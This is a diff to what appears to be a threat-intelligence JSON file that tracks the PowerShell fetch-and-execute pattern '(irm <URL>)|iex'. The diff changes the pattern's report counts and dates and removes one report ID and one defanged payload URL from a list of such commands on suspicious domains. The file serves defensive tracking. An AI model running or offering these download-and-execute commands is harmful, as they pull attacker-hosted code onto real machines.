@@ -310,12 +310,11 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 122,
-    "ReportCount": 122,
-    "FirstSeen": "2026-11-15T17:24:06.080000+00:00",
+    "DistinctPayloadCount": 121,
+    "ReportCount": 121,
+    "FirstSeen": "2026-11-16T04:26:58.277000+00:00",
     "LastSeen": "2026-11-22T11:36:15.111000+00:00",
     "ReportIds": [
-      "cmwi3te6h0xgl0omlrat1pbrc",
       "cmwirhula12jv0omlobsquqwk",
       "cmwisrtbm14hw0omlck8hqp55",
       "cmwj51q3c17cv0oml0cqeivw1",
@@ -447,7 +446,6 @@
       "(irm 'https://github[.]pw/wp/0eadba8e6c7373ad')|iex",
       "(irm 'https://github[.]pw/wp/4ff6ecee35528485')|iex",
       "(irm 'https://github[.]pw/wp/a99138664d16b6b2')|iex",
-      "(irm 'https://github[.]pw/wp/e9e0a4eb0e5a4b04')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/0164f0f9b6033a37')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/02db2195c02a03ad')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/07bf7672d2d763f3')|iex",
